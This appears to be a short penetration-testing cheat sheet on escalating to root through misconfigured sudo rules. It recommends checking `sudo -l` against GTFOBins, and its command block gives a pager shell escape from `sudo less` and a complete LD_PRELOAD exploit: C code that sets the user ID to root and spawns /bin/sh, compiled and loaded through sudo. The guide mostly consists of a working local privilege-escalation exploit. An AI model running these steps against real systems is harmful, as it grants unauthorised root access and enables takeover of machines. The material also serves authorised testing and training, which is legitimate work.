# 12.04 sudo Misuse

> Read `sudo -l` and weaponize allowed entries via GTFOBins — including `env_keep+=LD_PRELOAD` and pager escapes.

## Overview

`sudo -l` shows allowed commands. Many entries on GTFOBins escalate even when the command 'looks' restricted (less, vi, awk, find, env_keep+=LD_PRELOAD).

## Steps

- **Run `sudo -l`** — note allowed commands + NOPASSWD.
- **Look up on GTFOBins for each entry**.
- **Try env-keep tricks** — LD_PRELOAD, PYTHONPATH.

## Commands

### sudo edge cases

```bash
sudo -l
sudo less /etc/profile
!sh
# LD_PRELOAD trick if env_keep+=LD_PRELOAD
cat > /tmp/x.c <<'EOF'
#include <stdlib.h>
void _init(){ unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/sh"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so apache2 restart
```
